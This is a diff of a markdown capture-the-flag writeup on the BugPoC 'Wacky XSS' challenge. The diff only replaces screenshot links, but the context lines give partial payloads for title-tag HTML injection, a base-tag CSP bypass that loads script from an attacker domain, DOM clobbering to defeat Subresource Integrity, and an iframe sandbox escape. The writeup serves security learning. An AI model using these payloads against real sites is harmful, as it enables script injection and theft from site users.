@@ -6,7 +6,7 @@ description: In this writeup I will show my solution for Wacky XSS challenge.
 Hi, here is my writeup of bugpoc's XSS challenge so we had a URL wacky.buggywebsite.com which shows this page.
 
 
-![image](https://gyanihackers.com/blog/wp-content/uploads/2020/11/Screenshot-20-1024x614.png)
+![image](../../../assets/images/wacky-xss-1.png)
 
 
 Here we had a textbox where we could enter text and it shows text with some fancy style but we were not allowed to enter some characters such as <, >, &, %, *
@@ -40,7 +40,7 @@ document.getElementById('btn').onclick = function(){
 due to the replace function in above some special characters were replacing but here we could see that we have another file frame.html with a parameter so I opened it and I saw that value of parameter was reflecting in the title of webpage
 
 
-![image](https://gyanihackers.com/blog/wp-content/uploads/2020/11/Screenshot-21-1024x614.png)
+![image](../../../assets/images/wacky-xss-2.png)
 
 
 and also it was not filter means we have html injection so after closing the title tag we could execute HTML code. Now here we could not execute JavaScript directly because their was CSP (Content Security policy) so I started analyzing CSP and found that base-uri was missing.
@@ -52,13 +52,13 @@ and also it was not filter means we have html injection so after closing the tit
 *Missing base-uri allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain.*
 
 
-![image](https://gyanihackers.com/blog/wp-content/uploads/2020/11/Untitled-1-1024x576.png)
+![image](../../../assets/images/wacky-xss-3.png)
 
 
 I hope you got the use of base tag from above image. Lets confirm this in challenge so I added base tag in parameter
 
 
-![image](https://gyanihackers.com/blog/wp-content/uploads/2020/11/Screenshot-23-1-1024x614.png)
+![image](../../../assets/images/wacky-xss-4.png)
 
 
 Here movie.pm4 was loading from evil.com. Now we had to load JavaScript file from our server and frame.html should be in iframe because if its not in iframe then frame-analytics.js will not load so I created payload to load JS file from another domain
@@ -69,7 +69,7 @@ Payload : </title></head><body><iframe src='https://wacky.buggywebsite.com/frame
 ```
 
 
-![image](https://gyanihackers.com/blog/wp-content/uploads/2020/11/Screenshot-24-1024x614.png)
+![image](../../../assets/images/wacky-xss-5.png)
 
 
 and We were able to load frame-analytics.js from another domain. Now I setup my flask server to load my JavaScript code.
@@ -97,7 +97,7 @@ if __name__ == '__main__':
 ```
 
 
-![image](https://gyanihackers.com/blog/wp-content/uploads/2020/11/Screenshot-25-768x461.png)
+![image](../../../assets/images/wacky-xss-6.png)
 
 
 Now the response in console was different and It was giving error because of Subresource Integrity in script tag.
@@ -147,7 +147,7 @@ paylaod : <a id=fileIntegrity><a id=fileIntegrity name=value href=theamanrawat>
 this payload will defined the value of window.fileintegrity and we were able to load our JavaScript code.
 
 
-![image](https://gyanihackers.com/blog/wp-content/uploads/2020/11/Screenshot-27-1024x614.png)
+![image](../../../assets/images/wacky-xss-7.png)
 
 
 Now alert was blocked because of sandbox in iframe so we had to bypass this and bypassing this sandbox was very simple because we can execute JavaScript function such as createElement(), console.log() and etc..
@@ -164,7 +164,7 @@ To bypass this I created script tag outside the sandbox iframe and my final payl
 I sent this payload and the alert was executed :)
 
 
-![image](https://gyanihackers.com/blog/wp-content/uploads/2020/11/Screenshot-17-edited.png)
+![image](../../../assets/images/wacky-xss-8.png)
 
 
 # Now its time to create working PoC on bugpoc.
@@ -173,7 +173,7 @@ I sent this payload and the alert was executed :)
 I used **mock endpoint builder** for JavaScript code
 
 
-![image](https://gyanihackers.com/blog/wp-content/uploads/2020/11/Screenshot-29-edited.png)
+![image](../../../assets/images/wacky-xss-9.png)
 
 
 and then **Flexible Redirector** for redirecting all path to mock endpoint.
@@ -182,7 +182,7 @@ and then **Flexible Redirector** for redirecting all path to mock endpoint.
 Now I created front end poc to run the exploit.
 
 
-![image](https://gyanihackers.com/blog/wp-content/uploads/2020/11/Screenshot-31-1024x614.png)
+![image](../../../assets/images/wacky-xss-10.png)
 
 
 That’s it for this writeup. You can check the my PoC on https://bugpoc.com/poc#bp-uvrG5pXO & password : `SHYwasp53`
